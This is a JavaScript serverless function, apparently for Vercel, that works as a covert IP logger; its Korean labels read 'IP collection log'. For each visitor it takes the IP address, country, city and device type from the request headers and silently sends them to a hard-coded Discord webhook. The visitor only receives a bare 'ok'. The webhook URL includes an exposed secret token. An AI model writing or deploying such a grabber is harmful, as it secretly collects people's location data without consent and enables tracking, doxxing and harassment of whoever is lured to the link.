export default async function handler(req, res) {
    const webhook = "https://discord.com/api/webhooks/1528376701396979754/sfsDF_chTT-2mZlyeyA1rJYy3u1cl5DhlWB3ANOgqtiG3kkjTPcfRwzDJccu1fJhvgvl";

    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
    const country = req.headers['x-vercel-ip-country'] || '??';
    const city = req.headers['x-vercel-ip-city'] || '??';
    const userAgent = req.headers['user-agent'] || 'unknown';

    const payload = {
        content: "**IP 수집 로그**",
        embeds: [{
            title: "방문자 정보",
            color: 0x00ff00,
            fields: [
                { name: "IP", value: ip, inline: true },
                { name: "국가", value: country, inline: true },
                { name: "도시", value: city, inline: true },
                { name: "시간", value: new Date().toLocaleString('ko-KR'), inline: false },
                { name: "기기", value: userAgent.includes('Android') ? 'Android' : userAgent.includes('iPhone') ? 'iOS' : 'PC', inline: true }
            ]
        }]
    };

    await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    });

    res.status(200).send("ok");
}
